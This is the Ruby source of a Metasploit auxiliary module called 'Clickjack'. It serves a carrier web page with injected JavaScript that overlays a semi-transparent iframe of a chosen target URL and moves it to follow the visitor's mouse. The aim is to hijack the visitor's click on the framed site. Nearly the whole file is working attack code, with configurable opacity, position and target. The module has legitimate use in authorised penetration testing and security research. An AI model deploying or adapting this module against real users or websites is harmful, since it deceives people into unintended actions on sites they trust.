require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'		   => 'Clickjack',
			'Description'    => %q{
This module creates a page containing an iframe set to an opacity of your
choice that will follow the client mouse.  This will require styled properties
of the target page and size values of click areas.	The actual iframe page
size should be used for best accuracy however the defaults should work in most
cases.  All of these items will require some finesse for a truly interesting
attack.  At current you get to jack a single click.	Make it count.  Mouse
following code taken directly from RSnake's generic PoC.
		},
		'License'		 => BSD_LICENSE,
		'Author'		 =>
		[
			'Saint Patrick <saintpatrick@l1pht.com>'
		],
			'Version'		 => '$Revision:$',
			'References'	 => [
				['URL','http://www.sectheory.com/clickjacking.htm'],
				['URL','http://jeremiahgrossman.blogspot.com/2008/10/clickjacking-web-pages-can-see-and-hear.html']
		]
			))
						 register_options(
							 [
								 OptInt.new('CLICKWIDTH', [true, "The width of the clickable area",100]),
								 OptInt.new('CLICKHEIGHT', [true, "The height of the clickable area",100]),
								 OptInt.new('DIVTOP', [false, "If follow is false, allows position from top",500]),
								 OptInt.new('DIVLEFT', [false, "If follow is false, allows position from left",500]),
								 OptBool.new('FOLLOW', [false, "Follow mouse?",true]),
								 OptString.new('HOSTPAGE',	[ true, "The HTML that we'll use as a carrier",File.join(Msf::Config.install_root, "data", "exploits", "capture", "http", "index.html")]),
								 OptInt.new('IFRAMEWIDTH', [true, "The complete page width of the page appearing in the iframe",1200]),
								 OptInt.new('IFRAMEHEIGHT', [true, "The complete page height of the page appearing in the iframe",1200]),
								 OptRaw.new('OPACITY', [true, "IFRAME opacity (valid 0.0-1.0)",0.5]),
								 OptRaw.new('STYLETOP',	[true, "The 'top' style of the IFRAME",-500]),
								 OptRaw.new('STYLELEFT',	[true, "The 'left' style of the IFRAME",-500]),
								 OptString.new('TARGETURL',   [ true, "The URL that will be placed in the invisible iframe","http://www.dc405.org"]),
						 ], self.class)
	end

	def on_request_uri(cli, request)
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
		resp = build_page
		send_response(cli,resp)
		print_status("Sent page to #{cli.peerhost}")
	end

	# Returns the carrier page, spliced with the tailored clickjacking script
	def build_page
		page = String.new
		@hostpage.each do |sourceline|
			# Always insert my script right after the first <html> tag.
			if sourceline =~ /<html>/i
				page << sourceline
				page << scriptwork
			else
				page << sourceline
			end
		end
		# Impart a blessing upon our client
		return page
	end

	# The script.
	def scriptwork
		# Just initing
		script = String.new
		# If follow is off, position the DIV
		if (!@follow)
			script << %Q^<style>div#target{top:#{@divtop}px;left:#{@divleft}px;}</style>^
		end
		script << %Q^<script>
if (document.getElementById || document.all)
document.write('<div id="target" style="position:relative;width:#{@clickwidth}px;height:#{@clickheight}px;overflow:hidden;">')
document.write('<iframe id="content" src="#{@target}" scrolling=no frameborder=0 style="opacity:#{@opacity};filter: alpha(opacity=#{@opacity}); -moz-opacity:#{@opacity}; position:absolute;top:#{@top}px; left:#{@left}px;width:#{@iframewidth}px; height:#{@iframeheight}px;"></iframe></div>')^
# Toggle mousefollowing code
if (@follow)
	script<<"\n"
	script<<%Q^

function gettrailobj(){
if (document.getElementById)
return document.getElementById("target").style
else if (document.all)
return document.all.target.style
}

function truebody(){
return (!window.opera && document.compatMode && document.compatMode!="BackCompat")? document.documentElement : document.body
}

function followmouse(e){
var browser=navigator.appName;
if (browser == "Microsoft Internet Explorer") {
var xcoord= -3
var ycoord= -3
} else {
var xcoord= 40
var ycoord= 40
}
if (typeof e != "undefined"){
xcoord+=e.pageX - 50
ycoord+=e.pageY - 50
} else if (typeof window.event !="undefined"){
xcoord+=truebody().scrollLeft+event.clientX
ycoord+=truebody().scrollTop+event.clientY
}
var docwidth=document.all? truebody().scrollLeft+truebody().clientWidth : pageXOffset+window.innerWidth-15
var docheight=document.all? Math.max(truebody().scrollHeight, truebody().clientHeight) : Math.max(document.body.offsetHeight, window.innerHeight)
if (xcoord+50+3>docwidth || ycoord+50> docheight)
gettrailobj().display="none"
else
gettrailobj().display=""
gettrailobj().left=xcoord+"px"
gettrailobj().top=ycoord+"px"
}

document.onmousemove=followmouse;
	^
end
# Pinch off the script tag
script<<%Q^</script>^
return script
	end

	# Initialize all things holy
	def run
		@target = datastore['TARGETURL']
		# These lines will be layed back down with script spliced in
		@hostpage = File.readlines(datastore['HOSTPAGE'])
		@top = datastore['STYLETOP']
		@left = datastore['STYLELEFT']
		@clickwidth = datastore['CLICKWIDTH']
		@clickheight = datastore['CLICKHEIGHT']
		@opacity = datastore['OPACITY']
		@follow = datastore['FOLLOW']
		@divtop = datastore['DIVTOP']
		@divleft = datastore['DIVLEFT']
		@iframewidth = datastore['IFRAMEWIDTH']
		@iframeheight = datastore['IFRAMEHEIGHT']
		exploit()
	end
end
